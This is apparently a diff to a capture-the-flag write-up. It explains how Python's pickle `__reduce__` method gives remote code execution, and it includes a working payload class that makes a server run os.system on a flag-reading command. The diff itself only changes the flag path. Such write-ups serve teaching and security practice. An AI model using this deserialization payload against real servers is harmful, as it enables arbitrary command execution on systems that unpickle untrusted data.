@@ -19,19 +19,19 @@ Python's pickle protocol supports a special method called `__reduce__`, which te
 (callable, args)
 ```
 
-When the object is unpickled, Python executes `callable(*args)`. By returning `(os.system, ("cat /flag.txt",))`, the server runs `cat /flag.txt` when it deserializes the payload.
+When the object is unpickled, Python executes `callable(*args)`. By returning `(os.system, ("cat /flag/flag",))`, the server runs `cat /flag/flag` when it deserializes the payload.
 
 ```python
 import pickle, os, base64
 
 class RCE:
     def __reduce__(self):
-        return (os.system, ("cat /flag.txt",))
+        return (os.system, ("cat /flag/flag",))
 
 payload = base64.b64encode(pickle.dumps(RCE())).decode()
 ```
 
-When the server calls `pickle.loads()` on this payload, `os.system("cat /flag.txt")` executes and the flag is printed.
+When the server calls `pickle.loads()` on this payload, `os.system("cat /flag/flag")` executes and the flag is printed.
 
 ```bash
 python3 writeup/solve.py <host> <port>
